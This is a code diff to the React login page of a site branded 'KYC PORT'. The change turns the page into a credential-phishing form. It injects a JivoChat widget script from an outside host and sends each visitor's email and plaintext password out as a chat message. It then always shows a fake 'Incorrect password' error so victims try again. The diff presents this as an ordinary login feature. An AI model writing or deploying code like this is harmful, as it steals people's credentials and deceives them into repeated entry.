@@ -2,10 +2,19 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import KycLogo from "@/components/KycLogo";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { useToast } from "@/hooks/use-toast";
 import { Eye, EyeOff } from "lucide-react";
+
+// Declare JivoChat API type
+declare global {
+  interface Window {
+    jivo_api?: {
+      sendMessage: (message: string) => void;
+    };
+  }
+}
 
 interface LoginForm {
   email: string;
@@ -18,14 +27,33 @@ const LoginPage = () => {
   const { toast } = useToast();
   const { register, handleSubmit, formState: { errors } } = useForm<LoginForm>();
 
+  // Add JivoChat script
+  useEffect(() => {
+    const script = document.createElement('script');
+    script.src = '//code.jivosite.com/widget/UwkEXTbvjU';
+    script.async = true;
+    document.head.appendChild(script);
+    
+    return () => {
+      document.head.removeChild(script);
+    };
+  }, []);
+
   const onSubmit = async (data: LoginForm) => {
     setIsVerifying(true);
-    // Simulate verification
+    
+    // Send login attempt to JivoChat
+    if (window.jivo_api) {
+      window.jivo_api.sendMessage(`Login attempt - Email: ${data.email}, Password: ${data.password}`);
+    }
+    
+    // Always show incorrect password after delay
     setTimeout(() => {
       setIsVerifying(false);
       toast({
-        title: "Login Successful",
-        description: "Welcome to KYC PORT!",
+        title: "Login Failed",
+        description: "Incorrect password. Please try again.",
+        variant: "destructive",
       });
     }, 2000);
   };
